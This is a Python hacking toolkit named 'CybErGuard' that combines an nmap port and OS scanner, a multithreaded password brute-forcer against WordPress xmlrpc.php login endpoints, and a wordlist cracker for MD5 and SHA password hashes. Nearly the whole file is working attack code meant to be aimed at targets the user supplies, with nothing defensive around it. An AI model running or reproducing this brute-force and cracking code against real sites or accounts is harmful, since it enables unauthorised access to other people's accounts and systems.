import argparse
import nmap
import subprocess
import sys
import requests
import urllib3
import os
import threading
import ipaddress
import socket
import hashlib


os.system('cls' if os.name == 'nt' else 'clear')

def print_colored_banner():

    start_color = "\033[91;1m" 
    end_color = "\033[91;1m"       
    reset_color = "\033[0m"   

    ascii = f"""
    {start_color}
  ▄████▄▓██   ██▓ ▄▄▄▄   ▓█████  ██▀███    ▄████  █    ██  ▄▄▄       ██▀███  ▓█████▄     ██████╗     ██████╗
 ▒██▀ ▀█ ▒██  ██▒▓█████▄ ▓█   ▀ ▓██ ▒ ██▒ ██▒ ▀█▒ ██  ▓██▒▒████▄    ▓██ ▒ ██▒▒██▀ ██▌    ╚════██╗   ██╔═████╗
 ▒▓█    ▄ ▒██ ██░▒██▒ ▄██▒███   ▓██ ░▄█ ▒▒██░▄▄▄░▓██  ▒██░▒██  ▀█▄  ▓██ ░▄█ ▒░██   █▌     █████╔╝   ██║██╔██║
 ▒▓▓▄ ▄██▒░ ▐██▓░▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄  ░▓█  ██▓▓▓█  ░██░░██▄▄▄▄██ ▒██▀▀█▄  ░▓█▄   ▌    ██╔═══╝    ████╔╝██║
 ▒ ▓███▀ ░░ ██▒▓░░▓█  ▀█▓░▒████▒░██▓ ▒██▒░▒▓███▀▒▒▒█████▓  ▓█   ▓██▒░██▓ ▒██▒░▒████▓     ███████╗██╗╚██████╔╝
 ░ ░▒ ▒  ░ ██▒▒▒ ░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░ ░▒   ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒▓  ▒     ╚══════╝╚═╝ ╚═════╝
     ░  ▒  ▓██ ░▒░ ▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░  ░   ░ ░░▒░ ░ ░   ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ▒  ▒
 ░       ▒ ▒ ░░   ░    ░    ░     ░░   ░ ░ ░   ░  ░░░ ░ ░   ░   ▒     ░░   ░  ░ ░  ░
 ░ ░     ░ ░      ░         ░  ░   ░           ░    ░           ░  ░   ░        ░
 ░       ░ ░           ░                                                      ░
 
  (o o)                                          (o o)
 (  V  ) Made by Erdajt Sopjani and GuardianN06 (  V  )
 --m-m--------------------------------------------m-m--
    {end_color}{reset_color}
    """

    print(f"{ascii}\n")

available_commands = ["network", "help", "exit", "brute", "hash", "", "clear"]

print_colored_banner()


def is_valid_ip_address(ip):
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ipaddress.AddressValueError:
        return False

def call_nmap():
    os.system('cls' if os.name == 'nt' else 'clear')
    print_colored_banner()

    try:
        target = input("\n[+] What is the target ip address: ")
        ports = input("[+] Specify which ports to scan Example [1-1000]: " or 1-1000)
    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print_colored_banner()
        main_loop()

    while (is_valid_ip_address(target) == False):
        print("Invalid IP address")
        target = input("[+] Which target do you want to scan: ")


    nm = nmap.PortScanner()
    try:
        nm.scan(target, ports, arguments='-O -sV')
    except nmap.nmap.PortScannerError as e:
        if 'requires root privileges' in str(e):
            print('\n\n[+] Error: TCP/IP fingerprinting (for OS scan) requires root privileges.')
            print('[+] Please run the script with root privileges (e.g., using sudo).\n\n')
            sys.exit(1)
        else:
            raise e


    for host in nm.all_hosts():
        print('\n\n\n\n----------------------------------------------------\n')
        print('Host: %s (%s)' % (host, nm[host].hostname()))
        print('State: %s' % nm[host].state())
        print('\n')
        if 'osmatch' in nm[host]:
            print('-----------------------------------------------------\n')
            print('Operating System:\n')
            for os_match in nm[host]['osmatch']:
                print('     Name: %s' % os_match['name'])
                print('     Accuracy: %s' % os_match['accuracy'])
        for proto in nm[host].all_protocols():
            print('\n-----------------------------------------------------\n')
            print('Protocol: %s\n' % proto)
            lport = list(nm[host][proto].keys())
            lport.sort()
            for port in lport:
                port_info = nm[host][proto][port]
                print('     Port: %s\tState: %s\tService: %s\tVersion: %s' % (
                    port, port_info['state'], port_info['name'], port_info['version']
                ))

def call_brute():
    os.system('cls' if os.name == 'nt' else 'clear')

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


    def send_auth_attempt(url, username, password):
        xml_request = '''
        <methodCall>
            <methodName>wp.getUsersBlogs</methodName>
            <params>
                <param><value>{}</value></param>
                <param><value>{}</value></param>
            </params>
        </methodCall>
        '''.format(username, password)

        headers = {'Content-Type': 'text/xml'}
        data = xml_request.encode('utf-8')

        response = requests.post(url, headers=headers, data=data, verify=False)

        if "403" in response.content.decode():
            print("[+] Authentication failed for username: {}, password: {}".format(username, password))
        elif "parse error" in response.content.decode():
            print("[+] Authentication failed for username: {}, password: {}".format(username, password))
        elif "insufficient" in response.content.decode():
            print("[+] Authentication failed for username: {}, password: {}".format(username, password))
        elif "404" in response.content.decode():
            print("[+] Authentication failed for username: {}, password: {}".format(username, password))
        else:
            print("[+] Authentication succeeded for username: {}, password: {}".format(username, password))
            os._exit(0)


    def login_script():

        print_colored_banner()
        try: 
            target_url = input("[+] Enter the XMLRPC endpoint of the target: ")
            username = input("[+] Enter the username for login attempts: ")
            password_file = input("[+] Enter the wordlist file path: ")
            num_threads = int(input("[+] Enter the number of threads to use (default: 5): ") or 5)
        except KeyboardInterrupt:
            os.system('cls' if os.name == 'nt' else 'clear')
            print_colored_banner()
            main_loop()

        if target_url == "" or username == "" or password_file == "":
            print("[+] No valid arguments passed")
            target_url = input("[+] Enter the XMLRPC endpoint of the target: ")
            username = input("[+] Enter the username for login attempts: ")
            password_file = input("[+] Enter the wordlist file path: ")
            num_threads = int(input("[+] Enter the number of threads to use (default: 5): ") or 5)
  
        if not target_url.endswith('xmlrpc.php'):
            if not target_url.endswith('/'):
                target_url += '/'
            target_url += 'xmlrpc.php'

        def attempt_login(password):
            password = password.strip()
            send_auth_attempt(target_url, username, password)

        with open(password_file, 'r') as f:
            threads = []
            for password in f:
                password = password.strip()
                t = threading.Thread(target=attempt_login, args=(password,))
                threads.append(t)
                t.start()

                if len(threads) >= num_threads:
                    for t in threads:
                        t.join()
                    threads = []

            for t in threads:
                t.join()

        print("[+] No valid authentication found for username: {}, password: {}".format(username, password))

    try:
        login_script()
    except KeyboardInterrupt:
        quit()



def call_hash_crack():

    available_hash_types = ["sha1", "md5", "sha224", "sha256"]

    try:
        hash_type = input("[+] What hash type do you want to crack: ")
        while hash_type not in available_hash_types:
            print("[+] Invalid hash type!! Options: 'sha1', 'md5', 'sha224', 'sha256'")
            hash_type = input("[+] What hash type do you want to crack: ")

        hashPass = input("[+] Enter the hashed password: ")
        wordlist = input("[+] Enter the path to the wordlist you want to use (default: rockyou.txt): ")

    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print_colored_banner()
        main_loop()

    if wordlist == "":
        wordlist = "rockyou.txt"

    password_found = threading.Event() 

    def pass_found(hashPass, word):
        print(f"\n[+] Password Cracked on {hashPass} --> {word}\n\nCracked Password saved on: \"cracked.txt\"\n\n")

        try:
            with open("cracked_pass.txt", "w") as file:
                file.write(f"\nCracked: {hashPass} ---> {word}\n")
        except Exception as e:
            print(f"[+] Failed to write the cracked password to 'cracked.txt': {e}")

        password_found.set()
        main_loop()

    def password_cracker(hash_function, hashPass, wordlist, start, end):
        with open(wordlist, "r", encoding="latin-1") as f:
            for line in f.readlines()[start:end]:
                if password_found.is_set():
                    break  

                for word in line.strip().split():
                    hash_object = hash_function(f"{word}".encode('utf-8'))
                    hashed = hash_object.hexdigest()
                    if hashed == hashPass:
                        pass_found(hashPass, word)
                        return
                    else:
                        print(f"[+] Failed attempt --> {word}")
                        continue


    hash_functions = {
        "md5": hashlib.md5,
        "sha224": hashlib.sha224,
        "sha256": hashlib.sha256,
        "sha1": hashlib.sha1
    }

    if hash_type not in hash_functions:
        print("[+] Invalid hash type!! Options: 'sha1', 'md5', 'sha224', 'sha256'")
        return

    hash_function = hash_functions[hash_type]

    threads = []
    num_threads = 4 


    with open(wordlist, "r", encoding="latin-1") as f:
        lines = f.readlines()
        chunk_size = len(lines) // num_threads
        for i in range(num_threads):
            start = i * chunk_size
            end = start + chunk_size
            if i == num_threads - 1:
                end = len(lines)
            thread = threading.Thread(target=password_cracker, args=(hash_function, hashPass, wordlist, start, end))
            threads.append(thread)
            thread.start()


    for thread in threads:
        thread.join()

    print("[+] No match found. Try a different wordlist.\n")


def main_loop(): 

    while True:
        user_input = input("CybErGuard => ")

        if user_input.lower() == "exit":
            print("[+] Exiting CybErGuard...")
            sys.exit(0)
            break

        if user_input.lower() == "help":
            print("[+] Available commands:")
            print("\texit - Exit CybErGuard")
            print("\tclear - Clear the screen")
            print("\thelp - Show this help")
            print("\tbrute - Perform brute attack on websites using XmlBrute")
            print("\tnetwork - Scan a network for open ports and operating systems using nmap")
            print("\thash - Crack a password hash using a wordlist")
            print("\n\nPress Ctrl+C to exit any use\n\n")

        if user_input.lower() == "brute":
            call_brute()
            print_colored_banner()

        elif user_input.lower() == "network":
            call_nmap()
            print_colored_banner()

        elif user_input.lower() == "hash":
            call_hash_crack()
            print_colored_banner()

        elif user_input not in available_commands :
            print(f"[+] Unknown command \"{user_input}\" try \"help\"")

        elif user_input == "clear":
            os.system('cls' if os.name == 'nt' else 'clear')
            print_colored_banner()



if __name__ == "__main__":
    main_loop()
